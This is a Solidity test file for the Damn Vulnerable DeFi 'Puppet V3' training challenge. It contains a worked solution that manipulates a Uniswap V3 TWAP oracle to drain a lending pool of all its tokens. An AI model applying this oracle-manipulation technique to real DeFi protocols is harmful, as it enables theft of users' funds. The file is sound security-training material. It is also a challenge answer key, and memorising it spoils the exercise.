// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";

import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";

contract PuppetV3Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint24 constant FEE = 3000;

    IUniswapV3Factory uniswapFactory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
    INonfungiblePositionManager positionManager =
        INonfungiblePositionManager(payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88));
    WETH weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    DamnValuableToken token;
    PuppetV3Pool lendingPool;

    uint256 initialBlockTimestamp;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 15450164);

        startHoax(deployer);

        // Set player's initial balance
        deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deployer wraps ETH in WETH
        weth.deposit{value: UNISWAP_INITIAL_WETH_LIQUIDITY}();

        // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
        token = new DamnValuableToken();

        // Create Uniswap v3 pool
        bool isWethFirst = address(weth) < address(token);
        address token0 = isWethFirst ? address(weth) : address(token);
        address token1 = isWethFirst ? address(token) : address(weth);
        positionManager.createAndInitializePoolIfNecessary({
            token0: token0,
            token1: token1,
            fee: FEE,
            sqrtPriceX96: _encodePriceSqrt(1, 1)
        });

        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
        uniswapPool.increaseObservationCardinalityNext(40);

        // Deployer adds liquidity at current price to Uniswap V3 exchange
        weth.approve(address(positionManager), type(uint256).max);
        token.approve(address(positionManager), type(uint256).max);
        positionManager.mint(
            INonfungiblePositionManager.MintParams({
                token0: token0,
                token1: token1,
                tickLower: -60,
                tickUpper: 60,
                fee: FEE,
                recipient: deployer,
                amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY,
                amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );

        // Deploy the lending pool
        lendingPool = new PuppetV3Pool(weth, token, uniswapPool);

        // Setup initial token balances of lending pool and player
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), LENDING_POOL_INITIAL_TOKEN_BALANCE);

        // Some time passes
        skip(3 days);

        initialBlockTimestamp = block.timestamp;

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertGt(initialBlockTimestamp, 0);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV3() public checkSolvedByPlayer {
        // STEP 1: Manipulate the tick range for a favorable price
        // Swap all the player's DVT balance to push the tick out of the current range.
        // This will result in a tick value of -887,272.
        // The PuppetV3Pool uses OracleLibrary::consult() to retrieve the `arithmeticMeanTick`,
        // making DVT very cheap when swapped for WETH in the lending pool.
        // Transfer the WETH obtained from the swap to the recovery account to only use
        // PLAYER_INITIAL_ETH_BALANCE during the borrowing step.
        ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

        token.approve(address(swapRouter), PLAYER_INITIAL_TOKEN_BALANCE);

        swapRouter.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(token),
                tokenOut: address(weth),
                fee: 3000,
                recipient: player,
                deadline: block.timestamp + 15,
                amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        weth.transfer(recovery, weth.balanceOf(player));

        // STEP 2: Oracle manipulation to adjust the price
        // OracleLibrary::consult() returns a tick value proportional to the number of seconds,
        // specifically (−887,272 × seconds).
        // PuppetV3Pool::_getOracleQuote() will use this tick in OracleLibrary::getQuoteAtTick()
        // to compute the price.
        // Then PuppetV3Pool::calculateDepositOfWETHRequired() multiplies the price by
        // DEPOSIT_FACTOR = 3 to determine the required WETH deposit.
        // The goal is to minimize the number of seconds needed to trade 1M DVT for 1 WETH.
        skip(101 seconds);

        // STEP 3: Borrow the tokens and finalize the exploit
        // Perform the borrow operation using the initial assigned ETH balance.
        // Transfer the borrowed tokens to the recovery account.
        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
        weth.approve(
            address(lendingPool),
            lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)
        );
        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }


    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertLt(block.timestamp - initialBlockTimestamp, 115, "Too much time passed");
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), LENDING_POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }

    function _encodePriceSqrt(uint256 reserve1, uint256 reserve0) private pure returns (uint160) {
        return uint160(FixedPointMathLib.sqrt((reserve1 * 2 ** 96 * 2 ** 96) / reserve0));
    }
}
